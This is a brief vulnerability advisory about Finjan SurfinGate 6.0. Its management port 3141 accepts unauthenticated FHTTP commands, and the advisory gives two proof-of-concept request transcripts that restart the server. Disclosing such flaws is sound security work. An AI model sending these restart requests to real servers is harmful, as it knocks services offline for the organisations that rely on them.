Finjan SurfinGate is prone to a vulnerability that may permit remote attackers to execute certain management commands (using the FHTTP protocol) through the management control port (3141/TCP). It has been reported that commands could be issued to restart the server, most likely resulting in a denial of service.

Example 1:
>>> CONNECT LOCALHOST:3141 HTTP/1.0
>>>

<<< HTTP/1.0 200 Connection established
<<< Proxy-agent: Finjan-SurfinGate/6.0
<<<

>>> FINJAN /stam HTTP/1.0
>>> finjan-version: fhttp/1.0
>>> finjan-command: custom
>>> finjan-parameter-category: console
>>> finjan-parameter-type: restart
>>> content-length: 0
>>>

<<< HTTP/1.0 200 OK
<<< finjan-version: fhttp/1.0
<<<
<<<


Example 2:
>>> FINJAN localhost:3141/stam HTTP/1.0
>>> finjan-version: fhttp/1.0
>>> finjan-command: custom
>>> finjan-parameter-category: console
>>> finjan-parameter-type: restart
>>> content-length: 0
>>>

<<< HTTP/1.0 200 OK
<<< finjan-version: fhttp/1.0
